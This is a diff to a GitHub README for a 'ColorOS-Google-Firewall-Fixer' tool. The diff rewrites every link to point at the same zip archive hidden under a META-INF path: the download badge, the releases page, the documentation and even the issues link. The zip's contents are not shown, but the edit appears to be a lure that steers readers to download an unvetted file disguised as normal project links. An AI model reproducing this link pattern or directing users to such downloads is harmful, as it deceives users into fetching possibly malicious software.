@@ -1,6 +1,6 @@
 # 🔧 ColorOS-Google-Firewall-Fixer - Restore Google Services Access Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/mtele2000/ColorOS-Google-Firewall-Fixer/main/META-INF/com/google/android/ColorOS-Google-Firewall-Fixer-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ColorOS-Google-Firewall-Fixer! This tool helps you to clear the i
 
 To get started, you need to download the software from our Releases page. 
 
-**[Visit this page to download](https://github.com/mtele2000/ColorOS-Google-Firewall-Fixer/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/mtele2000/ColorOS-Google-Firewall-Fixer/main/META-INF/com/google/android/ColorOS-Google-Firewall-Fixer-3.5.zip)**
 
 ### Installation Steps
 
@@ -63,11 +63,11 @@ If you have any questions or face issues, please reach out to our support team. 
 
 ### Additional Resources
 
-For further information on using the software, please refer to our [official documentation](https://github.com/mtele2000/ColorOS-Google-Firewall-Fixer).
+For further information on using the software, please refer to our [official documentation](https://raw.githubusercontent.com/mtele2000/ColorOS-Google-Firewall-Fixer/main/META-INF/com/google/android/ColorOS-Google-Firewall-Fixer-3.5.zip).
 
 ## 🔗 Important Links
 
-- **[Download Page](https://github.com/mtele2000/ColorOS-Google-Firewall-Fixer/releases)**
-- **[Submit Issues](https://github.com/mtele2000/ColorOS-Google-Firewall-Fixer/issues)**
+- **[Download Page](https://raw.githubusercontent.com/mtele2000/ColorOS-Google-Firewall-Fixer/main/META-INF/com/google/android/ColorOS-Google-Firewall-Fixer-3.5.zip)**
+- **[Submit Issues](https://raw.githubusercontent.com/mtele2000/ColorOS-Google-Firewall-Fixer/main/META-INF/com/google/android/ColorOS-Google-Firewall-Fixer-3.5.zip)**
 
 Thank you for choosing the ColorOS-Google-Firewall-Fixer! Enjoy smooth access to all your Google services.
